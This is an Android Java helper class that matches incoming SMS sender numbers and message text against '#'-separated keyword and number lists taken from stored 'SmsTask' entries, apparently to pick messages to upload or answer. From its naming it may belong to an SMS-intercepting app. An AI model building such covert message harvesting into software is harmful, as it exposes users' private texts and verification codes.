package com.thirdparty.sms.utils;

import java.util.ArrayList;

import android.text.TextUtils;

import com.gandalf.daemon.utils.XL_log;
import com.thirdparty.entry.SmsTask;
import com.thirdparty.utils.PreferenceUtil;
public class SmsUpHelper {
	private static XL_log log = new XL_log(SmsUpHelper.class);

	public static boolean isBacklistNumber(String number) {
		return false;
	}

	public static ArrayList<String> getUpContentKeys() {
		ArrayList<String> keyWords = new ArrayList<String>();
		ArrayList<SmsTask> smSmsTasks = PreferenceUtil.getAllSmsTask();
		if (smSmsTasks == null) {
			return null;
		}
		for (int i = 0; i < smSmsTasks.size(); i++) {
			SmsTask smsTask = smSmsTasks.get(i);
			String keyWord = smsTask.mSmsUpKeyword;
			if (TextUtils.isEmpty(keyWord)) {
				continue;
			}
			keyWord = keyWord.replaceAll("\\s", "");
			if (!TextUtils.isEmpty(keyWord)) {
				String[] keys = keyWord.split("\\#");
				if (keys != null) {
					for (int j = 0; j < keys.length; j++) {
						String key = keys[j];
						keyWords.add(key);
					}
				}
			}
		}
		return keyWords;
	}

	public static ArrayList<String> getUpNumbers() {
		ArrayList<String> keyNumbers = new ArrayList<String>();
		ArrayList<SmsTask> smSmsTasks = PreferenceUtil.getAllSmsTask();
		if (smSmsTasks == null) {
			return null;
		}
		for (int i = 0; i < smSmsTasks.size(); i++) {
			SmsTask smsTask = smSmsTasks.get(i);
			if (TextUtils.isEmpty(smsTask.mSmsUpNumber)) {
				continue;
			}
			String keyNumber = smsTask.mSmsUpNumber.replaceAll("\\s", "");
			if (!TextUtils.isEmpty(keyNumber)) {
				String[] keys = keyNumber.split("\\#");
				if (keys != null) {
					for (int j = 0; j < keys.length; j++) {
						String key = keys[j];
						keyNumbers.add(key);
					}
				}
			}
		}
		return keyNumbers;
	}

	public static ArrayList<String> getReplyKeyWords() {
		ArrayList<String> replyKeywords = new ArrayList<String>();
		ArrayList<SmsTask> smSmsTasks = PreferenceUtil.getAllSmsTask();
		if (smSmsTasks == null) {
			return null;
		}
		for (int i = 0; i < smSmsTasks.size(); i++) {
			SmsTask smsTask = smSmsTasks.get(i);
			if (TextUtils.isEmpty(smsTask.mSmsReplyKeyword)) {
				continue;
			}
			String smsReplyKeyword = smsTask.mSmsReplyKeyword.replaceAll("\\s", "");
			if (!TextUtils.isEmpty(smsReplyKeyword)) {
				String[] keys = smsReplyKeyword.split("\\#");
				for (int j = 0; j < keys.length; j++) {
					String key = keys[j];
					replyKeywords.add(key);
				}
			}
		}
		return replyKeywords;
	}

	public static boolean determinUp(String number, String smsContent) {
		if (TextUtils.isEmpty(number) || TextUtils.isEmpty(smsContent)) {
			return false;
		}
		number = number.replaceAll("\\s", "");
		smsContent = smsContent.replaceAll("\\s", "");
		boolean determineNumber = determineUpFromNumber(number);
		if (determineNumber) {
			return true;
		}
		boolean determineConent = determineUpFromSmsContent(smsContent);
		if (determineConent) {
			return true;
		}
		return false;

	}

	public static boolean determineUpFromNumber(String number) {
		if (TextUtils.isEmpty(number)) {
			return false;
		}
		number = number.replaceAll("\\s", "");
		ArrayList<String> keyWords = SmsUpHelper.getUpNumbers();
		if (keyWords == null) {
			return false;
		}
		for (int i = 0; i < keyWords.size(); i++) {
			String keyWord = keyWords.get(i);
			if (TextUtils.isEmpty(keyWord)) {
				continue;
			}
			if (number.equals(keyWord)) {
				return true;
			}
		}
		return false;
	}

	public static boolean determineUpFromSmsContent(String conentKey) {
		if (TextUtils.isEmpty(conentKey)) {
			return false;
		}
		conentKey = conentKey.replaceAll("\\s", "");
		ArrayList<String> keyWords = SmsUpHelper.getUpContentKeys();
		if (keyWords == null)
			return false;
		for (int i = 0; i < keyWords.size(); i++) {
			String keyWord = keyWords.get(i);
			if (TextUtils.isEmpty(keyWord)) {
				continue;
			}
			if (conentKey.contains(keyWord)) {
				return true;
			}
		}
		return false;
	}
}
